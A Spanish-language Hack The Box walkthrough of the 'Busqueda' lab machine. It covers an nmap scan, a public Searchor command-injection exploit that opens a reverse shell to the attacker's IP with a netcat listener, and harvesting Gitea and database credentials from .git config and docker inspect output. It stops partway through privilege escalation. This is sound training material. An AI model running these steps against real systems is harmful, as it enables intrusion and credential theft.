@@ -1,0 +1,39 @@
+HACK THE BOX - BUSQUEDA MACHINE
+
+- sudo nmap -sC -sV -sS -Pn 10.10.11.208 -oN NmapBusqueda                                                           -Escaneo de puertos, encontramos 2 puertos abiertos, 22 de SSH y 80 con la web http://searcher.htb/ y corriendo el servidor Apache/2.4.52 (Ubuntu) 
+
+            -Nos conectamos al servidor y nos damos cuenta que el DNS no funciona por lo tanto agregamos la direccion al /etc/hosts 
+
+- sudo vi /etc/hosts                                                                                                -Agregamos 10.10.11.208 searcher.htb
+
+            -Una vez conectados a la web y haciendo un breve research de la pagina, nos damos cuenta que este se encuentra corriendo Searchor 2.4.0, hacemos una busqueda en google y encontramos una exploit para https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
+            -El cual podemos aprovechar ya que nos permite hacer una Reverse Shell 
+
+- git clone https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection.git                     -Descargamos la herramienta a utilizar
+- cd Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection                                                             -Nos colocamos en el directorio y ejectuamos exploit.Shell, el cual nos indica la estructura para poder ejectuar el comando la cual es 
+- ./exploit.sh http://searcher.htb/ 10.10.14.43 4444                                                                -Ejecutamos el programa ingresando la url y luego nuestra IP y el puerto, antes de ejecutar es necesario activar un listener con netcat
+- nc -lvnp 4444                                                                                                     -Usamos netcat como listener para la reverse Shell
+
+            -Nos conectamos,nos damos cuenta que nos encontramos en svc@busqueda:/var/www/app$, hacemos un research de los directorios
+
+- python3 -c 'import pty;pty.spawn("/bin/bash")'                                                                    -Abrimos una shell de bash
+- ls -la                                                                                                            -Listamos los documentos dentro del directorio, en donde encontramos un directorio oculto ".git"
+- cd .git
+- ls                                                                                                                -Listamos el directorio git y encontramos: (branches - config - HEAD - index - logs - refs - COMMIT_EDITMSG - description - hooks - info - objects), y procedemos a verificar el archivo "config"
+- cat config                                                                                                        -En el archivo encontramos: http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git, del cual obtenemos 2 credenciales para el usuario cody:jh1usoih2bkjaspwe92 en gitea.searcher.htb
+
+            -Nos conectamos a la Url obtenida http://gitea.searcher.htb e ingresamos las credenciales obtenidas anteriormente. Una vez dentro verificamos que existe un editor "administrator", ademas podemos usar las anteriores credenciales para conectarnos a traves de SSH
+
+- sudo ssh svc@10.10.11.208                                                                                         -Con las credenciales obtenidas nos conectamos a traves de ssh
+- sudo -l                                                                                                           -Verificamos los permisos que tenemos con el usuario svc: a lo que podemos ver que es posible ejecutar lo siguiente: User svc may run the following commands on busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+
+            -Probamos ejecutando lo visto anteriormente
+
+- sudo /usr/bin/python3 /opt/scripts/system-checkup.py *                                                            -Nos da como resultado los argumentos necesarios para correr el script .py : Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
+- sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps                                                    -Probamos con el siguiente argumento, a lo que recibimos como resultados algunos dockers, que usaremos proximamente
+- sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect                                               -Al correr el comando, nos pide seguir el siguiente formato: Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>, por lo que tenemos el nombre de Container, anteriormente visto de la salida de docker-ps, a lo que nos faltaria el argumento <format>, googleamos docker-inspect en google y el formato de ingreso a lo que encontramos que podemos usar una salida 
+- sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e      -Ingresamos los argumentos el formato y el conteiner a lo que recibimos informacion importante y encontramos credenciales de la database: GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"
+
+            -Con la pass ingresada, ingresamos a gitea.searcher.htb, y nos logueamos como "administrator:yuiu1hoiu4i5ho1uh"
+
+- 
